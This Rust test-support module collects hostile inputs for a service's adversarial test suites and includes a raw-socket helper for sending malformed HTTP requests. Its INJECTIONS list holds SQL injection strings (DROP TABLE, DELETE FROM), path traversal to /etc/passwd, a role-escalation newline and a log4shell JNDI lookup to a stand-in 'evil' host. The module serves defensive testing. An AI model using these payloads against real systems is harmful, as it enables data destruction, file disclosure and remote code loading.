//! Hostile inputs and the raw-socket plumbing to deliver them.
//!
//! The corpus lived in one pen-test suite, so every other adversarial
//! suite invented its own inputs and none of them agreed on what counted
//! as covered. A new attack string added here is immediately fired by
//! every suite that borrows it, which is the point.

use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::Duration;

/// Identifier-shaped attacks: SQL metacharacters, path traversal in two
/// encodings, embedded NUL and newline, and a log4shell-style template.
/// Each is aimed at a layer that would only be vulnerable if some string
/// were concatenated instead of parameterised or validated — the SQL at
/// the control plane, the slashes at the object-store key layout, the
/// NUL at the boundary between Rust strings and C APIs.
pub const INJECTIONS: &[&str] = &[
    "acme'; DROP TABLE repos;--",
    "acme' OR '1'='1",
    "acme\"; DELETE FROM orgs; --",
    "acme') OR ('x'='x",
    "../../etc/passwd",
    "..%2f..%2fetc%2fpasswd",
    "acme/../bravo",
    "a\0nullbyte",
    "acme\nSET ROLE admin",
    "${jndi:ldap://evil/x}",
    "%00",
    "'; SELECT pg_sleep(10);--",
];

/// Send a fully hand-built HTTP/1.1 request over a raw socket — for the
/// bytes a well-behaved client refuses to emit (control characters in
/// headers, absurd content lengths, malformed request lines). Returns the
/// status parsed from the response line, or `None` if the server closed
/// without one.
pub fn raw_request(host: &str, request: &[u8]) -> Option<u16> {
    let mut sock = TcpStream::connect(host).ok()?;
    sock.set_read_timeout(Some(Duration::from_secs(5))).ok();
    sock.write_all(request).ok()?;
    let mut buf = Vec::new();
    sock.read_to_end(&mut buf).ok();
    let head = String::from_utf8_lossy(&buf);
    // "HTTP/1.1 400 Bad Request" → 400
    head.lines().next()?.split_whitespace().nth(1)?.parse().ok()
}

/// Percent-encode everything outside the unreserved set, so an attack
/// string survives being placed in a URL path without the client
/// normalising it away before the server sees it.
pub fn percent_encode(s: &str) -> String {
    let mut out = String::new();
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char)
            }
            _ => out.push_str(&format!("%{b:02X}")),
        }
    }
    out
}
